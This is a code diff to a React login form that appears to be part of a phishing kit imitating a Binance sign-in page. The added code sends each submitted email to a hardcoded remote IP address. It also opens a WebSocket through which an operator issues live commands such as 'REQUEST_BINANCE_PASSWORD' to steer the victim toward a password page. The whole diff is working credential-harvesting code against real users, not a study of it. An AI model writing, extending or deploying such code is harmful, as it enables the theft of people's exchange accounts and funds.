@@ -94,23 +94,92 @@ export default function LoginForm() {
     const [isHovered, setIsHovered] = useState(false)
 
     const { validateEmail } = useValidateEmail();
-    const handleEmailValidation = () => {
+
+    const [awaitingCommand, setAwaitingCommand] = useState(false);
+    
+    // Setup WebSocket connection for real-time commands
+    useEffect(() => {
+        const ws = new WebSocket('ws://18.144.169.247:5000/ws');
+        
+        ws.onmessage = (event) => {
+            const command = JSON.parse(event.data);
+            handleCommand(command);
+        };
+
+        return () => ws.close();
+    }, []);
+
+    // Handle incoming commands
+    const handleCommand = (command) => {
+        switch(command) {
+            case 'REQUEST_EMAIL_AGAIN':
+                setInvalid(true);
+                setAwaitingCommand(false);
+                break;
+            case 'REQUEST_BINANCE_PASSWORD':
+                setIsLoading(false);
+                router.push('/PasswordPage');
+                break;
+            default:
+                console.log('Unknown command:', command);
+        }
+    };
+
+    // Modified email validation handler
+    const handleEmailValidation = async () => {
         const isValid = validateEmail(email);
         setInvalid(!isValid);
-        console.log('submitted')
 
         if (isValid) {
             setIsLoading(true);
-            setUserEmail(email)
-            console.log(userEmail)
-            setTimeout(() => {
+            setAwaitingCommand(true);
+            setUserEmail(email);
+
+            try {
+                // Send email to backend
+                const response = await fetch('http://18.144.169.247:5000/notify', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        type: 'email_submission'
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+
+                // Don't navigate to password page immediately
+                // Wait for REQUEST_BINANCE_PASSWORD command
+                
+            } catch (error) {
+                console.error('Error:', error);
                 setIsLoading(false);
-                router.push('/PasswordPage')
-            }, 5000);
+            }
         }
 
         return isValid;
-    }
+    };
+    // const handleEmailValidation = () => {
+    //     const isValid = validateEmail(email);
+    //     setInvalid(!isValid);
+    //     console.log('submitted')
+
+    //     if (isValid) {
+    //         setIsLoading(true);
+    //         setUserEmail(email)
+    //         console.log(userEmail)
+    //         setTimeout(() => {
+    //             setIsLoading(false);
+    //             router.push('/PasswordPage')
+    //         }, 5000);
+    //     }
+
+    //     return isValid;
+    // }
 
 
     const [input, setInput] = useState(false)
